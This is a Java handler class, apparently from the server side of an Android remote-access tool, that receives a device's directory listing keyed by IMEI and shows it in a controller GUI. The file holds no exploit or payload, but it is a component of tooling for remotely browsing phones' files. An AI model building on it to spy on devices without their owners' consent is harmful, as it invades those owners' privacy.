package com.android.security.handler;

import java.io.File;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;

import com.android.security.gui.GUI;
import com.android.security.gui.server.Server;
import com.android.security.packages.FileTreePacket;
import com.android.security.packages.Packet;
 
public class FileTreeHandler implements PacketHandler {
	
	private GUI gui;
	private int channel;
	private String imei;
	
	public FileTreeHandler(int chan, String imei, GUI gui) {
		channel = chan;
		this.imei = imei;
		this.gui = gui;
	}

	@Override
	public void receive(Packet p, String imei) {
		// TODO Auto-generated method stub
	}

	@Override
	public void handlePacket(Packet p, String temp_imei, Server c) {
		gui.logTxt("目录树已获取");
		c.getChannelHandlerMap().get(imei).removeListener(channel);
		FileTreePacket packet = (FileTreePacket) p;
		/*try{
			FileOutputStream fout = new FileOutputStream(new File("list.txt"));
			ObjectOutputStream out = new ObjectOutputStream(fout);
			out.writeObject(packet.getList());
			out.close();
		} catch(Exception e){}*/
		gui.updateFileTree(imei, packet.getList());
	}
}
